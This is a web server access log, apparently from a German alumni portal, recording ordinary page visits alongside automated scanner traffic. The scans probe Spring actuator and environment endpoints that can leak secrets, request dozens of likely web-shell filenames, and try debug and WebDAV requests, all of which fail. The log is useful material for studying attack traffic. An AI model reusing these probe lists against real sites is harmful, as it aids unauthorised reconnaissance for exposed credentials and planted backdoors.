6f8938be6ce25a1071a31bc8ec2726f123cb90ce6dc6305f02d72100198b51ee;2025-11-22 02:58:13;;/3437963199;GET;404
9be024c272d29a897683629ab3274b6c6c973b0a21a92faefa41b99aa13651f7;2025-11-22 03:01:26;;/;GET;200
0764d84419c08f57713e96ffb7c66b7ab7a64cdf2d548580829a84ba32137dbb;2025-11-22 03:06:00;;/personen/alumni/schule/65262;GET;200
ba44aefb1e96b2ab0d6d0c04271cfffa1c7f153f0d9e1a62bd305479b39b569b;2025-11-22 03:09:55;;/rechtliches/green-data;GET;200
fee32e92cd29c0fc6b0e1ef76d83bf82497d4e26121cf0d658d65927427d4e8d;2025-11-22 03:14:58;;/personen/alumni/schule/164094;GET;200
f38a109ae57e12e35321944f0fc0fbfa28762b997d6adc68a3c1f20bc0f26123;2025-11-22 03:21:20;;/personen/alumni/schule/09A05;GET;200
be5931cbddcadc4d03d4c047b5c61de457c479348d88b9208be9fe20a1abf728;2025-11-22 03:25:44;;/;GET;200
4e5937c56de9e6d7fc7e598c76a22934757f45bf9bdfbf32a266f8cd9bbcf6da;2025-11-22 03:33:16;;/personen/alumni/schule/183052;GET;200
7fc14d49b868fcd06280763882580a0696ba7d7a1172cfe84d6da2a7d8b6ebb8;2025-11-22 03:36:22;;/personen/alumni/schule/185826;GET;200
5ce8d5931cfb7f6abb14de4abae5cecfdb33c80a7362fd2a1ae93da9a860369b;2025-11-22 03:40:05;/;/;GET;200
9d1d62c5a3ad46fb7199063c57773d08cd51bb07ae73ba6e1770f2e3f23fd35d;2025-11-22 03:41:51;;/;GET;200
58e125ccd5921b0f2eef85c5f0bd8b7a37b14ce4c66c985ef23e482a9b06e4b3;2025-11-22 03:43:10;;/personen/alumni/schule/170690;GET;200
cb151998ab0f5ac4eb9c02c3e3cf6de2c368ed373962d2e29383030a7f465f11;2025-11-22 03:44:04;;/;GET;200
08fb9e7a94938ee9167083457dfafeeb07fcc029e657d94aac4bd0be20d4b343;2025-11-22 03:53:33;;/personen/alumni/schule/59026;GET;200
9d7b6f0422c662d0d6d2d62e77f3586b1ddf3e6d4dce278fb314c441c0a50fcb;2025-11-22 04:02:56;;/personen/alumni/schule/5502;GET;200
09e9ec5c13c1030446d57d9375fde3d05cf848be6afd1c643a8b5fecd3fadc5c;2025-11-22 04:08:20;;/personen/alumni/schule/190627;GET;200
73c90c1ff3769c04338d0eb38478a6f65937dea6d0f8166ff231844175b9acc7;2025-11-22 04:08:55;;/;GET;200
accd5e2bd9206f3f1ac5d4dd4222cd845ef036f594a6cea57e57f9da0266c3d5;2025-11-22 04:24:00;;/personen/alumni/schule/4240016;GET;200
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-22 04:25:41;/env;/env;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-22 04:25:45;/mappings.json;/mappings.json;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-22 04:25:49;/info;/info;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-22 04:25:51;/env.json;/env.json;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-22 04:25:53;/actuator/;/actuator/;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-22 04:25:59;/actuator/mappings;/actuator/mappings;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-22 04:26:02;/staging/mappings;/staging/mappings;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-22 04:26:06;/staging/actuator/env;/staging/actuator/env;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-22 04:26:08;/staging/actuator/mappings;/staging/actuator/mappings;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-22 04:26:13;/test/mappings;/test/mappings;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-22 04:26:18;/test/actuator/mappings;/test/actuator/mappings;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-22 04:26:21;/v2/actuator/mappings;/v2/actuator/mappings;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-22 04:26:23;/test/actuator/env;/test/actuator/env;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-22 04:26:26;/v2/actuator/env;/v2/actuator/env;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-22 04:26:30;/v2/mappings;/v2/mappings;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-22 04:26:34;/actuator/env;/actuator/env;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-22 04:26:37;/actuator/,/env;/actuator/,/env;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-22 04:26:43;/api/actuator/;/api/actuator/;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-22 04:26:46;/api/actuator/env;/api/actuator/env;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-22 04:26:50;/api/actuator/,/env;/api/actuator/,/env;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-22 04:26:53;/management/;/management/;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-22 04:26:59;/management/mappings;/management/mappings;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-22 04:27:02;/management/env;/management/env;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-22 04:27:05;/management/,/env;/management/,/env;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-22 04:27:09;/dev/actuator/;/dev/actuator/;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-22 04:27:13;/dev/actuator/env;/dev/actuator/env;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-22 04:27:17;/app/actuator/;/app/actuator/;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-22 04:27:21;/app/actuator/env;/app/actuator/env;GET;404
d9bec6cab084b4235de8f09e4410dc7115977a3d4e0984541856f745ea76591e;2025-11-22 04:29:44;;/;GET;200
c717e8c0ea77dec413e7ae063fa838a8b532971c3fe37a52bdf6bde6d17461fa;2025-11-22 04:32:22;;/personen/alumni/schule/4340014;GET;200
a2e6a0b971d5dbbee7f67ccf8b1df6c741938e8ee095a6ef6a5e54099220f9e5;2025-11-22 04:35:37;;/aktuelles/meldungen/details/start-der-open-beta-jetzt-anmelden-und-testen;GET;200
03b8d4ab6806ede9d4317d49efc1625306c22d9855b21130ce75cf8c761dd616;2025-11-22 04:40:22;;/;GET;200
eb639149a613179817bc4e64920b2f932d6577755ff6999fed00f2838d8a8595;2025-11-22 04:43:11;;/personen/alumni/schule/59043;GET;200
3f8a7625906793f843318b1a273de2f7ff563bbdc98e9eebb9e3b3a8f4f12190;2025-11-22 04:43:35;;/suchergebnisse;GET;302
3f8a7625906793f843318b1a273de2f7ff563bbdc98e9eebb9e3b3a8f4f12190;2025-11-22 04:43:41;/suchergebnisse;/;GET;200
02e2f1393eb797f954fde586da58e8b3b44e5dbdecaba0160b1020eba89f1e91;2025-11-22 04:57:34;;/?XDEBUG_SESSION_START=phpstorm;GET;200
3c94e2bbbf0fd73aeb866f9eb1206124dc7215969c7f0f260ffd0c9d062ef24b;2025-11-22 05:13:57;;/personen/alumni/schule/190627;GET;200
b4cd046a3b99801becf0430969055d26bcb52bb668c4549411a9657d666a9a38;2025-11-22 05:14:23;;/personen/alumni/schule/HB0001;GET;200
1f7e1a300826b992950dfa3eb079a4ddc8c540f5c694c48849f01a07419abdbd;2025-11-22 05:18:31;/media/system/js/core.js;/media/system/js/core.js;GET;404
1f7e1a300826b992950dfa3eb079a4ddc8c540f5c694c48849f01a07419abdbd;2025-11-22 05:18:32;/wp-includes/js/jquery/jquery.js;/wp-includes/js/jquery/jquery.js;GET;404
bd94088bdee6771deb280429fb10507ce01233da510faa67ebb3d2d14e22e491;2025-11-22 05:18:33;/themen/details/abschied-aus-moabit;/themen/details/uni-zwischen-ebbe-und-flut;GET;200
58a1896198325ee0b0720f06c10dd11cfb90d42d780c8f373fbdad00a1391d11;2025-11-22 05:20:35;;/ab2g;GET;404
58a1896198325ee0b0720f06c10dd11cfb90d42d780c8f373fbdad00a1391d11;2025-11-22 05:20:37;;/ab2h;GET;404
58a1896198325ee0b0720f06c10dd11cfb90d42d780c8f373fbdad00a1391d11;2025-11-22 05:20:38;;/alive.php;GET;404
58a1896198325ee0b0720f06c10dd11cfb90d42d780c8f373fbdad00a1391d11;2025-11-22 05:20:45;;/;GET;200
58a1896198325ee0b0720f06c10dd11cfb90d42d780c8f373fbdad00a1391d11;2025-11-22 05:20:47;;/;GET;200
58a1896198325ee0b0720f06c10dd11cfb90d42d780c8f373fbdad00a1391d11;2025-11-22 05:20:49;;/teorema505?t=1;GET;404
94d10329701f972a4e9560982dcbf915d8d5021b7b3e7844d5e51d93ed97c11c;2025-11-22 05:21:44;;/personen/alumni/schule/SL001;GET;200
21c489e43f4db89683f76d049446007e01b73af471681bd7c622f07c80a0ea7d;2025-11-22 05:23:29;;/;GET;200
248fd95664548b86ca2725400f81e0f9509885ef75157ae2de91cbe4298f5614;2025-11-22 05:28:07;;/;GET;200
248fd95664548b86ca2725400f81e0f9509885ef75157ae2de91cbe4298f5614;2025-11-22 05:28:07;;/;GET;200
248fd95664548b86ca2725400f81e0f9509885ef75157ae2de91cbe4298f5614;2025-11-22 05:28:07;;/;GET;200
163fc7d30b42abc08e91b21b7c03e5c98ec32013f24e4eddacf46a89b461d206;2025-11-22 05:28:13;;/;GET;200
163fc7d30b42abc08e91b21b7c03e5c98ec32013f24e4eddacf46a89b461d206;2025-11-22 05:28:33;/;/;GET;200
dcda3cc89e0c539b6016c7d8f3eb437d4fe6950a9124ab5077c330d79b395e42;2025-11-22 05:34:15;/;/;GET;200
5d06ed8cfcc2fc53c12800f0a1931005367a4917c066e5e22a2a591e0fb0cb1a;2025-11-22 05:44:02;/;/;PROPFIND;405
f62e58ef9475731552f7e3e7d8d4cad0ffd5fb03d12b18d6f84bc23916674488;2025-11-22 05:44:52;;/personen/alumni/schule/5505;GET;200
606da49eb1b1965aecf784626c760e01a116aac1c6527c422a13429038da75ce;2025-11-22 05:45:25;;/;GET;200
579bbca7e45e3285bc44180ee850c92994443ccebd5c7a97fce1bb958bed43e9;2025-11-22 05:49:01;;/themen/details/der-start-ins-studium;GET;200
68448c5f9c0cfe0f84ac31afaa78b1640aef9644f45602cc7fe73d9f48457008;2025-11-22 05:51:29;;/developmentserver/metadatauploader;GET;404
c9b5d1d32bed002fc9f4e467261c6b01d736b0ccdc0e1399307dcc2d1694086d;2025-11-22 05:52:31;;/;GET;200
2165aa3c629e8890ec05724182e9f3d0673d40f4bd7ee7840fef454a883e57c8;2025-11-22 05:58:06;;/;GET;200
62f1b68d128294ddb8c10e270c3f6110f626411b9d49277ee0dc576b56788112;2025-11-22 06:01:59;;/;GET;200
a6790d60a003bdf978c75ccd8f0146fc7dac5aa6b3d26d94936e34a6f5d88083;2025-11-22 06:12:29;;/;GET;200
0a2f9383280bff3b62158e80b7e4b644b9c975f539efaebc1a0b1795b97570ac;2025-11-22 06:13:44;;/;GET;200
5d06ed8cfcc2fc53c12800f0a1931005367a4917c066e5e22a2a591e0fb0cb1a;2025-11-22 06:16:44;/;/;PROPFIND;405
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-22 06:17:52;/env;/env;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-22 06:17:55;/mappings.json;/mappings.json;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-22 06:18:00;/info;/info;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-22 06:18:03;/env.json;/env.json;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-22 06:18:08;/actuator/;/actuator/;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-22 06:18:09;/actuator/mappings;/actuator/mappings;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-22 06:18:11;/staging/mappings;/staging/mappings;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-22 06:18:13;/staging/actuator/env;/staging/actuator/env;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-22 06:18:15;/staging/actuator/mappings;/staging/actuator/mappings;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-22 06:18:18;/test/mappings;/test/mappings;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-22 06:18:23;/test/actuator/mappings;/test/actuator/mappings;GET;404
62f1b68d128294ddb8c10e270c3f6110f626411b9d49277ee0dc576b56788112;2025-11-22 06:18:23;;/;GET;200
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-22 06:18:25;/v2/actuator/mappings;/v2/actuator/mappings;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-22 06:18:28;/test/actuator/env;/test/actuator/env;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-22 06:18:33;/v2/actuator/env;/v2/actuator/env;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-22 06:18:34;/v2/mappings;/v2/mappings;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-22 06:18:35;/actuator/env;/actuator/env;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-22 06:18:37;/actuator/,/env;/actuator/,/env;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-22 06:18:40;/api/actuator/;/api/actuator/;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-22 06:18:45;/api/actuator/env;/api/actuator/env;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-22 06:18:47;/api/actuator/,/env;/api/actuator/,/env;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-22 06:18:49;/management/;/management/;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-22 06:18:51;/management/mappings;/management/mappings;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-22 06:18:55;/management/env;/management/env;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-22 06:18:59;/management/,/env;/management/,/env;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-22 06:19:02;/dev/actuator/;/dev/actuator/;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-22 06:19:05;/dev/actuator/env;/dev/actuator/env;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-22 06:19:08;/app/actuator/;/app/actuator/;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-22 06:19:12;/app/actuator/env;/app/actuator/env;GET;404
be4b0b647254c1d3c32347e29419885056169144761f8bb89b9349d0028b6637;2025-11-22 06:22:22;;/;GET;200
2a566da820b2b79ad2f6e00911e466d0c29699fd486022af32c00c9e3bbdeeae;2025-11-22 06:22:42;;/personen/alumni/schule/190627;GET;200
3d26b1ba38a2b067d2d9cdb27e80b45e14a75bdb972c7e2a4a340184077f948f;2025-11-22 06:27:04;;/themen/details/der-start-ins-studium;GET;200
3abdba58782dc7051e9aea66fa1b1185e9e99373c2e800cb21107390a2e1a74e;2025-11-22 06:35:11;/;/;GET;200
a6358c16800dc001dec3fa61b24dcec8134a91882323a20eff094fcc57038086;2025-11-22 06:36:13;;/themen/details/abschied-aus-moabit;GET;200
6e9cf7261ef52110b8c283d90853e230532bf54fcf48eaee97e7070c4d80c65d;2025-11-22 06:45:42;;/;GET;200
9848721278c322723fb490d875f7a6fe02087753abbc23ec35875ef817ce4622;2025-11-22 06:47:42;;/aktuelles/meldungen/details/hackerangriff-lauft-ins-leere;GET;200
6e9cf7261ef52110b8c283d90853e230532bf54fcf48eaee97e7070c4d80c65d;2025-11-22 06:50:04;;/webui/;GET;404
e9d23766def591482959fd656153dd049c0f2b4e2d502820b91b464c2580465f;2025-11-22 06:51:00;;/;GET;200
523ad906cf9fca20a718c01c912d3995c2292a861b5e0ac8c52e5ad3759b1e23;2025-11-22 06:51:00;;/themen?category=bildung;GET;200
29cae18f927d15103199e7e1758489715b68adf5bd337af283ad1a7faec97e72;2025-11-22 06:55:24;;/;GET;200
e9d23766def591482959fd656153dd049c0f2b4e2d502820b91b464c2580465f;2025-11-22 06:56:30;;/personen;GET;200
9bb3fb21a76ae6a5cc98cddd293ec8809d319c9e3889b847ada4392f96009177;2025-11-22 06:57:10;;/personen/alumni/schule/59043;GET;200
5d06ed8cfcc2fc53c12800f0a1931005367a4917c066e5e22a2a591e0fb0cb1a;2025-11-22 06:58:26;/;/;PROPFIND;405
b061806b17cca8de77e34afcab7ecf5f2d97fdf63aeafa1dc1765e1d46e27a04;2025-11-22 06:59:43;;/;GET;200
b061806b17cca8de77e34afcab7ecf5f2d97fdf63aeafa1dc1765e1d46e27a04;2025-11-22 06:59:45;;/personen;GET;200
b061806b17cca8de77e34afcab7ecf5f2d97fdf63aeafa1dc1765e1d46e27a04;2025-11-22 06:59:45;;/themen/details/abschied-aus-moabit;GET;200
b061806b17cca8de77e34afcab7ecf5f2d97fdf63aeafa1dc1765e1d46e27a04;2025-11-22 06:59:45;;/aktuelles/meldungen/details/start-der-open-beta-jetzt-anmelden-und-testen;GET;200
b061806b17cca8de77e34afcab7ecf5f2d97fdf63aeafa1dc1765e1d46e27a04;2025-11-22 06:59:45;;/aktuelles/meldungen/details/alumni-portal-des-zbw-geht-an-den-start;GET;200
b061806b17cca8de77e34afcab7ecf5f2d97fdf63aeafa1dc1765e1d46e27a04;2025-11-22 06:59:45;;/aktuelles/meldungen/details/hackerangriff-lauft-ins-leere;GET;200
6e9cf7261ef52110b8c283d90853e230532bf54fcf48eaee97e7070c4d80c65d;2025-11-22 07:06:23;;/geoserver/web/;GET;404
3cb80ea505857c238082915d49a7a952c3f26121faea4fdca2d44a1279ffd321;2025-11-22 07:07:26;;/aktuelles/stellenangebote;GET;200
242d0e9c32a13c08b150da7dbb44be25c356892ea858b72d633d3daa723c1104;2025-11-22 07:07:45;/themen/details/abschied-aus-moabit;/themen?category=politik;GET;200
a31306057511df7b34d97fd6c9e5a608d345b53bf166636bd319fb37f20d0b7f;2025-11-22 07:08:37;;/aktuelles/stellenangebote;GET;200
242d0e9c32a13c08b150da7dbb44be25c356892ea858b72d633d3daa723c1104;2025-11-22 07:09:07;/gruppen/hobby/malen-und-zeichnen;/gruppen/hobby/programmieren;GET;302
242d0e9c32a13c08b150da7dbb44be25c356892ea858b72d633d3daa723c1104;2025-11-22 07:09:09;/gruppen/hobby/malen-und-zeichnen;/gruppen;GET;200
23c747c26d9f122e0e1654fcb547c3a7f078e0cb0c6f2f565175d0a1ab9d196d;2025-11-22 07:10:40;;/;GET;200
4d594e973e3a2b8f518335c719ec16a07e37a3d993a1b74242286384ba5398f4;2025-11-22 07:13:20;;/aktuelles/meldungen?category=wissenschaft;GET;200
36b7b73e115bcf8095506612fbbfcf26d87042c20925e337ba72f36cd8dc079c;2025-11-22 07:14:24;;/themen/details/abschied-aus-moabit;GET;200
02e2f1393eb797f954fde586da58e8b3b44e5dbdecaba0160b1020eba89f1e91;2025-11-22 07:17:16;;/actuator/gateway/routes;GET;404
0d70af07f80b83da451154ff1dc0e762d81adc3aefa8e0d86b0cdb5ff0a645f7;2025-11-22 07:18:14;;/aktuelles/meldungen/details/start-der-open-beta-jetzt-anmelden-und-testen;GET;200
f24766118e548f4a46d9aed498bd919906a91fb124f8dfafbf7e664ebbde448d;2025-11-22 07:23:33;;/themen/details/was-kommt-nach-dem-abitur;GET;200
02c7f07950ea476df86662d4d439ae896002b84f0776095b4c9625bf88a280a3;2025-11-22 07:26:14;;/aktuelles/meldungen/details/hackerangriff-lauft-ins-leere;GET;200
b6f3124cafde9ded3cc1bb9399d5537476c9b7216353157d2d04d02273874637;2025-11-22 07:28:10;;/docs/img/gleichrichterV2.png;GET;404
d2234e42d5f52c8b7356e6d345e16531c8c01bd9ecd2596022f5938b932a43a7;2025-11-22 07:32:34;;/personen/alumni/schule/185826;GET;200
138fc50186f92c8a518c5dab8fce9c2e490bd06e5c41fb2466351bf998bf6fe7;2025-11-22 07:33:52;;/themen/details/david-gegen-goliath;GET;200
917e2ce768ddd61971f81829609fcabe5b1ae4d9b166b1a15e10571d4eea8434;2025-11-22 07:34:23;;/aktuelles/meldungen/details/alumni-portal-des-zbw-geht-an-den-start;GET;200
f7c2aa83f3b775486e39503e8a94edeaccd8b1898089c086e59352a4db4082e6;2025-11-22 07:38:20;;/;GET;200
2cf67e681332db32e149d635a31715214df58bf8f5f4d1853a969e6161d376ac;2025-11-22 07:44:22;;/aktuelles/meldungen/details/start-der-open-beta-jetzt-anmelden-und-testen;GET;200
bb4a165bbc76ea7dff873306e9bee1a028f9193be5e1f5c521fc5b0257423669;2025-11-22 07:50:14;;/;GET;200
cdba9cd45d5a48f26b2fe2ac4ddcd59ebc21dd941868632713695832bb592f7a;2025-11-22 07:50:44;;/themen/2;GET;200
5d805f0740041f39c329cf9634ba9cd4c8175fc53fbc96efc6594037872bc198;2025-11-22 07:53:37;/gruppen/hobby/malen-und-zeichnen;/gruppen/interesse/it-und-softwareentwicklung;GET;200
bb1294089a5a90a17401145f5281afbf66fb7026c595bc5d600980d00dd90527;2025-11-22 07:54:04;;/themen/details/der-start-ins-studium;GET;200
bd94088bdee6771deb280429fb10507ce01233da510faa67ebb3d2d14e22e491;2025-11-22 07:55:02;/gruppen/hobby/malen-und-zeichnen;/gruppen/hobby/wandern;GET;302
bd94088bdee6771deb280429fb10507ce01233da510faa67ebb3d2d14e22e491;2025-11-22 07:55:02;/gruppen/hobby/malen-und-zeichnen;/gruppen;GET;200
413a6f12113a0414efd5202d136fe34229a4204561998575d2f97cd08020851d;2025-11-22 07:56:12;;/admin/config.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-22 07:56:41;;/wp-content/plugins/hellopress/wp_filemanager.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-22 07:56:42;;/shoha.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-22 07:56:42;;/yyy.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-22 07:56:42;;/ooj.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-22 07:56:43;;/0.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-22 07:56:43;;/x3.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-22 07:56:43;;/hzz.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-22 07:56:43;;/dom.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-22 07:56:44;;/dds.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-22 07:56:44;;/gg.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-22 07:56:44;;/past.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-22 07:56:45;;/class-db.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-22 07:56:45;;/bq.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-22 07:56:45;;/tro.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-22 07:56:45;;/lov.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-22 07:56:46;;/wsz.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-22 07:56:46;;/73106.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-22 07:56:46;;/nas.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-22 07:56:46;;/acp.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-22 07:56:47;;/aol7.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-22 07:56:47;;/wui.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-22 07:56:47;;/wp-admin/new2.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-22 07:56:47;;/poj.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-22 07:56:48;;/log.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-22 07:56:48;;/zoro.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-22 07:56:48;;/ker.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-22 07:56:49;;/aaa.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-22 07:56:49;;/efa4f.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-22 07:56:49;;/a2.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-22 07:56:49;;/dop.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-22 07:56:50;;/l.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-22 07:56:50;;/sec.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-22 07:56:50;;/set.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-22 07:56:50;;/pn.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-22 07:56:51;;/awh77.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-22 07:56:51;;/520.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-22 07:56:51;;/hey.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-22 07:56:51;;/ed35f.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-22 07:56:52;;/reyha.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-22 07:56:52;;/lok.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-22 07:56:52;;/hgm.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-22 07:56:53;;/nax.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-22 07:56:53;;/xrp.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-22 07:56:53;;/bypltspd.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-22 07:56:53;;/nc.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-22 07:56:54;;/hob.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-22 07:56:54;;/fs.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-22 07:56:54;;/re.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-22 07:56:54;;/sow.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-22 07:56:55;;/xzs.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-22 07:56:55;;/ppp.php;GET;404
